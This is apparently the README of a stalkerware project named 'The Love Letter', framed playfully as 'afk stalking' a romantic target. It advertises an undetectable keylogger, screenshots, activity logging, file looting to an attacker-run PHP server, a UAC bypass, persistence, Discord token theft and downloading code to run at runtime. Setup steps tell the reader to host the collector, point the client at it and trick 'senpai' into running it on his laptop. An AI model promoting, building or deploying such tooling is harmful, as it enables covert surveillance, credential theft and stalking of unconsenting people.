## What is The Love Letter?
An all-around tool for afk stalking ❤️ built primarily on minimal code, portability and a single executable (and the least includes as possible)

**Server-sided PHP file included**

## What do I offer?
- Undetectable keylogger
- A smart event-based screenshot
- Windows activity logger (like [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon))
- **Looting via file upload - faster and less buggier than email**
- UAC bypass - credits to [UACME](https://github.com/hfiref0x/UACME)
- Turns itself into a System application
- Discord token stealer
- Compiles code at runtime (snippets downloaded from server)
- Silent and lightweight, noone will ever notice it's running

and many more, I just don't feel like writing it all here. Explore the source code for yourself and see.

## Setup...
1. First you need a server, you may use any free webhosting service as long as it has PHP, upload [TellMe.php](Server/TellMe.php) there
1. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) to your endpoint
1. Now all you need is to gain senpai's trust and run the program on his laptop
